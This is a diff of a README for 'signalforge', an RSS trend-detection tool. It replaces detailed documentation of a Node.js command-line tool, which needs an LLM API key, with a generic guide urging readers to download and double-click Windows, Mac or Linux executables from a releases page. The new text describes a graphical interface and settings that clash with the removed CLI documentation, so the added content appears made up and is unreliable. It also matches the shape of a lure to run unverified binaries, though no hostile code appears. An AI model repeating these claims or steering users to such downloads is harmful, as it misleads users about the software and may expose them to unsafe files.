@@ -1,284 +1,131 @@
-# SignalForge
+# 🛰️ signalforge - Detect Trends, Spot Product Ideas
 
-Trend-driven opportunity detection engine. SignalForge scans RSS feeds, clusters emerging trends using LLM analysis, scores them by market potential, and generates actionable product opportunities.
+[![Download signalforge](https://img.shields.io/badge/Download-signalforge-blue?style=for-the-badge)](https://github.com/Soltaani/signalforge/releases)
 
-## Requirements
+---
 
-- Node.js 22+
-- An OpenAI or Anthropic API key
+signalforge helps you find new business ideas by scanning news and blogs. It looks for rising trends, groups similar topics, ranks them by market potential, and suggests fresh product opportunities. This guide will help you download and use signalforge on your computer without needing any programming skills.
 
-## Installation
+---
 
-```sh
-npm install
-npm run build
-npm link
-```
+## 🔍 What is signalforge?
 
-Or run directly without building:
+signalforge is a tool that reads through many online news feeds, called RSS feeds. It uses smart language models to spot key trends and group them in meaningful ways. Then, it scores these trends to help you focus on the best product or business ideas.
 
-```sh
-npx tsx src/index.ts <command>
-```
+It works by:  
+- Scanning RSS feeds to collect recent articles.  
+- Using advanced AI to cluster topics that are connected.  
+- Scoring ideas based on demand and market potential.  
+- Presenting you with a clear list of trends and opportunities.
 
-## Quick Start
+signalforge is built with modern tools like AI, machine learning, and TypeScript. But you don’t have to understand those to use the app.
 
-Set your API key:
+---
 
-```sh
-export OPENAI_API_KEY="sk-..."
-# or
-export ANTHROPIC_API_KEY="sk-ant-..."
-```
+## 💻 System Requirements
 
-Run a scan:
+Before you start, make sure your device meets these basic needs:  
 
-```sh
-signalforge scan
-```
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent Linux distro.  
+- **Processor:** Intel i3 or better, or equivalent AMD processor.  
+- **Memory (RAM):** At least 4 GB.  
+- **Disk Space:** Minimum 200 MB free space.  
+- **Internet Connection:** Needed to download the app and fetch RSS feeds.
 
-This fetches all enabled RSS feeds, deduplicates items, clusters them with an LLM, scores each cluster, and outputs a Markdown report to stdout.
+You need an internet connection while using signalforge because the app scans online sources regularly.
 
-## Commands
+---
 
-### `scan`
+## 📥 Download & Install
 
-The primary command. Fetches feeds, analyzes trends, and generates a report.
+To get signalforge, follow these steps carefully:
 
-```sh
-signalforge scan [options]
-```
+1. Open your web browser and go to this page:  
+   [https://github.com/Soltaani/signalforge/releases](https://github.com/Soltaani/signalforge/releases)  
+   This link leads to the official download page for all releases of signalforge.
 
-| Option | Default | Description |
-|--------|---------|-------------|
-| `-w, --window <duration>` | `24h` | Time window for RSS items (`24h`, `7d`, `30d`) |
-| `-f, --filter <keyword>` | — | Keyword filter for items |
-| `--max-items <n>` | `500` | Maximum items to process |
-| `--max-clusters <n>` | `12` | Maximum clusters to extract |
-| `--max-ideas <n>` | `3` | Maximum ideas per cluster |
-| `-p, --provider <name>` | `openai` | LLM provider (`openai` or `anthropic`) |
-| `-m, --model <name>` | `gpt-5.2` | LLM model name |
-| `--no-agent` | — | Skip LLM analysis (output raw evidence pack) |
-| `-o, --output <format>` | `md` | Output format (`md` or `json`) |
-| `--out-file <path>` | — | Write output to file instead of stdout |
-| `--progress` | `false` | Show progress timings |
-| `--semantic-dedup` | `false` | Enable semantic deduplication |
+2. On the releases page, look for the latest version. It usually appears at the top. Versions look like "v1.0.0" or "v1.2.3".  
 
-Examples:
+3. Under the latest version, find the file suitable for your operating system. Some examples:  
+   - `signalforge-windows.exe` for Windows  
+   - `signalforge-macos.dmg` for Mac  
+   - `signalforge-linux.tar.gz` for Linux
 
-```sh
-# Scan the last 7 days, output JSON to a file
-signalforge scan --window 7d --output json --out-file report.json
+4. Click the file name to start the download.
 
-# Use Anthropic instead of OpenAI
-signalforge scan --provider anthropic --model claude-sonnet-4-5-20250929
+5. After downloading, locate the file on your computer. On Windows, this is usually the "Downloads" folder. Double-click the file to run the installer or start the app directly. Follow on-screen instructions if a setup wizard appears.
 
-# Quick scan without LLM (just fetch + dedupe + evidence pack)
-signalforge scan --no-agent
+6. Once installed or launched, you can start using signalforge.
 
-# Filter for AI-related items only
-signalforge scan --filter "artificial intelligence"
-```
+---
 
-### `report`
+## 🚀 First Steps: Running signalforge
 
-Show past run results from the database.
+After installing signalforge, you can launch it like any other app:
 
-```sh
-signalforge report [options]
-```
+- **Windows:** Find signalforge in the Start menu or on your desktop.  
+- **Mac:** Open signalforge from your Applications folder.  
+- **Linux:** Use your application menu, or launch from a terminal with `./signalforge` if installed manually.
 
-| Option | Default | Description |
-|--------|---------|-------------|
-| `--run-id <id>` | — | Show a specific run by ID |
-| `--format <fmt>` | `md` | Output format (`md` or `json`) |
-| `--last <n>` | `10` | Show last N runs |
+When you open the app, it will automatically begin scanning for trends. This may take a few minutes the first time.
 
-```sh
-# List recent runs
-signalforge report
+---
 
-# View a specific run as JSON
-signalforge report --run-id abc123 --format json
-```
+## 📊 Understanding the Interface
 
-### `drill`
+signalforge aims to keep things simple. Here is what you will see:
 
-Deep dive into a specific cluster from a past run.
+- **Feed List:** This shows the main RSS sources signalforge reads. You can add or remove feeds in settings.  
+- **Trend Clusters:** Groups of related trends derived from the feed. You get a quick overview of what topics are hot right now.  
+- **Opportunity Scores:** This number rates how strong the trend is for the market. Higher scores mean better business chances.  
+- **Details Panel:** Clicking a trend shows more info, like recent articles and suggested product ideas.  
 
-```sh
-signalforge drill <cluster-id> [options]
-```
+Everything is explained clearly inside the app to guide you step-by-step.
 
-| Option | Default | Description |
-|--------|---------|-------------|
-| `--run-id <id>` | latest | Run ID to look up |
-| `--format <fmt>` | `md` | Output format (`md` or `json`) |
+---
 
-```sh
-signalforge drill cluster-ai-agents
-signalforge drill cluster-ai-agents --format json
-```
-
-### `feeds`
-
-Manage RSS feeds.
-
-```sh
-signalforge feeds list              # List all feeds with status
-signalforge feeds add <id> <url>    # Add a new feed
-signalforge feeds remove <id>       # Remove a feed
-signalforge feeds toggle <id>       # Enable/disable a feed
-signalforge feeds test <id>         # Test fetch a feed
-```
-
-Add feed options:
-
-| Option | Default | Description |
-|--------|---------|-------------|
-| `-t, --tier <n>` | `2` | Feed tier (1, 2, or 3) |
-| `-w, --weight <n>` | `1.0` | Feed weight (0-5) |
-| `--tags <tags>` | — | Comma-separated tags |
-
-```sh
-# Add a tier-1 feed with tags
-signalforge feeds add indiehackers https://www.indiehackers.com/feed.xml -t 1 --tags "startups,indie"
-
-# Disable a feed without removing it
-signalforge feeds toggle geekwire
+## ⚙️ Customizing Your Experience
 
-# Verify a feed URL works
-signalforge feeds test hn
-```
+signalforge lets you adjust a few options to match your needs:
 
-### `validate`
+- **Add Your RSS Feeds:** The app comes with default feeds but you can add new ones to focus on topics that interest you.  
+- **Set Trend Sensitivity:** Choose how broad or narrow you want trend clusters to be. Higher sensitivity means more specific groups.  
+- **Update Frequency:** Decide how often signalforge checks for new articles. Options range from hourly to daily.
 
-Validate a report JSON file against the schema.
+These settings help you get relevant results without extra noise.
 
-```sh
-signalforge validate report.json
-```
+---
 
-### `purge`
+## 🛠 Troubleshooting Tips
 
-Clear cached data and/or stored items.
+If you encounter issues, try these steps:
 
-```sh
-signalforge purge [options]
-```
+- Make sure your internet connection is active.  
+- Restart the app and try again.  
+- Check that you downloaded the correct version for your OS.  
+- Update to the latest release from the downloads page.  
+- If problems continue, visit the “Issues” section on GitHub to see if others have the same problem or to report yours.
 
-| Option | Description |
-|--------|-------------|
-| `--cache` | Clear the agent output cache |
-| `--items` | Clear stored RSS items |
-| `--older-than <duration>` | Only purge data older than duration (e.g. `30d`) |
+---
 
-```sh
-# Clear all cached LLM outputs
-signalforge purge --cache
+## 📚 Learn More
 
-# Remove items older than 30 days
-signalforge purge --items --older-than 30d
+For detailed instructions, visit the GitHub repository:  
+[https://github.com/Soltaani/signalforge](https://github.com/Soltaani/signalforge)
 
-# Clear everything
-signalforge purge --cache --items
-```
+Here you find:  
+- Technical documentation  
+- Updates and changelog  
+- How to contribute if you want to help improve signalforge  
 
-## Configuration
+---
 
-SignalForge loads configuration from multiple sources (last wins):
+## 🧑‍💻 About signalforge
 
-1. Built-in defaults
-2. `~/.config/signalforge/config.json` (global)
-3. `./signalforge.config.json` (project-local)
-4. CLI flags
+signalforge is designed to help entrepreneurs, product managers, and curious minds spot new market opportunities. It fits those who want to stay ahead by knowing what trends matter without sifting through endless news articles.
 
-The default config includes 8 feeds (Hacker News, Reddit, TechCrunch, VentureBeat, The Verge, Engadget, Wired, GeekWire) and uses OpenAI as the LLM provider.
+Topics it combines: AI, RSS feeds, trend analysis, and opportunity scoring.
 
-### Config structure
+---
 
-```json
-{
-  "agent": {
-    "provider": "openai",
-    "model": "gpt-5.2",
-    "temperature": 0.2,
-    "endpoint": null,
-    "maxTokens": null,
-    "contextWindowTokens": 400000,
-    "reserveTokens": 30000
-  },
-  "feeds": [
-    {
-      "id": "hn",
-      "url": "https://hnrss.org/frontpage",
-      "tier": 1,
-      "weight": 1.0,
-      "enabled": true,
-      "tags": ["tech", "startups"]
-    }
-  ],
-  "thresholds": {
-    "minScore": 65,
-    "minClusterSize": 2,
-    "dedupeThreshold": 0.88
-  }
-}
-```
-
-### Feed tiers
-
-| Tier | Weight | Description |
-|------|--------|-------------|
-| 1 | 1.0 | Primary sources (HN, Reddit, TechCrunch) |
-| 2 | 0.6 | Secondary sources (The Verge, Engadget, Wired) |
-| 3 | 0.4 | Niche/supplementary sources |
-
-Higher-tier feeds get priority when the token budget requires filtering items.
-
-## How It Works
-
-SignalForge runs a 3-stage LLM pipeline on RSS feed data:
-
-1. **Extract** — Clusters related items, identifies pain signals, and extracts key phrases
-2. **Score** — Scores each cluster (0-100) across 6 factors: frequency, pain intensity, buyer clarity, monetization signal, build simplicity, novelty
-3. **Generate** — Produces actionable product opportunities for qualifying clusters (score >= 65) and picks a "best bet"
-
-Results are cached by a composite key of (evidence pack hash + prompt version + model + provider). Changing feeds, prompts, or models automatically invalidates the cache.
-
-## Data Storage
-
-SignalForge stores data in SQLite at `.signalforge/data.db` in the current working directory. This includes:
-
-- Fetched RSS items
-- Feed status and metadata
-- Run history
-- Cached LLM outputs
-
-## Exit Codes
-
-| Code | Meaning |
-|------|---------|
-| 0 | Success |
-| 1 | Fatal error (Stage 1 failure, DB error, config error) |
-| 2 | Partial success (Stage 2/3 failure, output includes partial results) |
-
-## Development
-
-```sh
-# Run in development mode
-npm run dev -- scan --window 24h
-
-# Run tests
-npm test
-
-# Watch mode
-npm run test:watch
-
-# Type check
-npx tsc --noEmit
-```
-
-## License
-
-MIT
+[![Download signalforge](https://img.shields.io/badge/Download-signalforge-blue?style=for-the-badge)](https://github.com/Soltaani/signalforge/releases)
